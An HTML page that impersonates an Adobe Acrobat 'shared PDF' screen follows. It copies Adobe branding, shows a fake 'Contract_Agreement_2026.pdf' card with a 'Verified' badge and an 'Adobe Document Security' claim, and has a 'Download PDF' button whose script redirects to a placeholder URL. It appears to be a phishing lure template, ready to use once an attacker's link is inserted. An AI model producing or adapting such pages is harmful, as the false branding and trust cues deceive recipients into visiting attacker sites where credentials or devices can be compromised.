<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Shared Document</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        @page { size: A4; margin: 0; }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Top navigation */
        .nav {
            background: #2c2c2c;
            padding: 14px 28px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .nav-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-brand svg {
            width: 28px;
            height: 24px;
        }

        .nav-brand-name {
            color: #ffffff;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 0.3px;
        }

        .nav-label {
            color: #8a8a8a;
            font-size: 12px;
            font-weight: 500;
            background: #3d3d3d;
            padding: 4px 12px;
            border-radius: 12px;
            margin-left: 10px;
        }

        /* Content */
        .content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 48px 20px;
        }

        .card {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 32px rgba(0, 0, 0, 0.06);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }

        /* Card banner */
        .card-banner {
            background: linear-gradient(135deg, #EB1000 0%, #b00c00 100%);
            padding: 32px 36px;
            text-align: center;
            color: #ffffff;
        }

        .card-banner-icon {
            width: 52px;
            height: 52px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 14px;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card-banner-icon svg {
            width: 28px;
            height: 28px;
        }

        .card-banner h1 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .card-banner p {
            font-size: 13px;
            opacity: 0.85;
            line-height: 1.5;
        }

        /* Card body */
        .card-body {
            padding: 32px 36px;
        }

        .file-block {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 18px;
            background: #fafafa;
            border: 1px solid #eeeeee;
            border-radius: 12px;
            margin-bottom: 24px;
        }

        .file-thumb {
            width: 48px;
            height: 56px;
            flex-shrink: 0;
        }

        .file-details {
            flex: 1;
            min-width: 0;
        }

        .file-name {
            font-size: 14px;
            font-weight: 600;
            color: #2c2c2c;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            margin-bottom: 3px;
        }

        .file-meta {
            font-size: 12px;
            color: #8a8a8a;
        }

        .file-badge {
            background: #e8f5e9;
            color: #2e7d32;
            font-size: 11px;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 10px;
            white-space: nowrap;
        }

        /* Stats row */
        .stats {
            display: flex;
            gap: 12px;
            margin-bottom: 28px;
        }

        .stat {
            flex: 1;
            text-align: center;
            padding: 14px 8px;
            background: #fafafa;
            border-radius: 10px;
        }

        .stat-value {
            font-size: 16px;
            font-weight: 700;
            color: #2c2c2c;
            margin-bottom: 2px;
        }

        .stat-label {
            font-size: 11px;
            color: #8a8a8a;
            text-transform: uppercase;
            letter-spacing: 0.4px;
        }

        /* Action button */
        .btn-action {
            width: 100%;
            background: #EB1000;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            padding: 15px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background 0.2s ease, box-shadow 0.2s ease;
            text-decoration: none;
        }

        .btn-action:hover {
            background: #c40d00;
            box-shadow: 0 4px 16px rgba(235, 16, 0, 0.25);
        }

        .btn-action svg {
            width: 18px;
            height: 18px;
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 18px;
            font-size: 11px;
            color: #b3b3b3;
        }

        .security-note svg {
            width: 13px;
            height: 13px;
            fill: #b3b3b3;
        }

        /* Footer */
        .footer {
            padding: 18px;
            text-align: center;
            font-size: 11px;
            color: #b3b3b3;
        }

        .footer a { color: #b3b3b3; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }

        /* Print / PDF styles */
        @media print {
            body { background: #ffffff; }
            .nav { background: #2c2c2c !important; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .card { box-shadow: none; border: 1px solid #e0e0e0; }
            .card-banner { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .btn-action { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .stat { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <div class="nav">
        <div class="nav-brand">
            <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
            </svg>
            <span class="nav-brand-name">Adobe Acrobat</span>
            <span class="nav-label">Shared File</span>
        </div>
    </div>

    <!-- Content -->
    <div class="content">
        <div class="card">
            <!-- Banner -->
            <div class="card-banner">
                <div class="card-banner-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
                        <polyline points="14 2 14 8 20 8"/>
                    </svg>
                </div>
                <h1>Shared PDF Document</h1>
                <p>A document has been shared with you via Adobe Acrobat</p>
            </div>

            <!-- Body -->
            <div class="card-body">
                <div class="file-block">
                    <svg class="file-thumb" viewBox="0 0 48 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M0 4C0 1.79 1.79 0 4 0H30L48 18V52C48 54.21 46.21 56 44 56H4C1.79 56 0 54.21 0 52V4Z" fill="#FFF0EF"/>
                        <path d="M30 0L48 18H34C31.79 18 30 16.21 30 14V0Z" fill="#FFCCC8"/>
                        <text x="24" y="40" text-anchor="middle" fill="#EB1000" font-size="11" font-weight="700" font-family="sans-serif">PDF</text>
                    </svg>
                    <div class="file-details">
                        <div class="file-name">Contract_Agreement_2026.pdf</div>
                        <div class="file-meta">Shared on Apr 14, 2026</div>
                    </div>
                    <span class="file-badge">Verified</span>
                </div>

                <div class="stats">
                    <div class="stat">
                        <div class="stat-value">3.6 MB</div>
                        <div class="stat-label">File Size</div>
                    </div>
                    <div class="stat">
                        <div class="stat-value">9</div>
                        <div class="stat-label">Pages</div>
                    </div>
                    <div class="stat">
                        <div class="stat-value">PDF 1.7</div>
                        <div class="stat-label">Format</div>
                    </div>
                </div>

                <button class="btn-action" id="downloadBtn" onclick="handleAction()">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                        <polyline points="7 10 12 15 17 10"/>
                        <line x1="12" y1="15" x2="12" y2="3"/>
                    </svg>
                    Download PDF
                </button>

                <div class="security-note">
                    <svg viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
                    Protected by Adobe Document Security
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        &copy; 2026 Adobe. All rights reserved. &middot;
        <a href="#">Privacy</a> &middot;
        <a href="#">Terms of Use</a>
    </div>

    <script>
        function handleAction() {
            window.location.href = 'REDIRECT_URL_HERE';
        }
    </script>
</body>
</html>
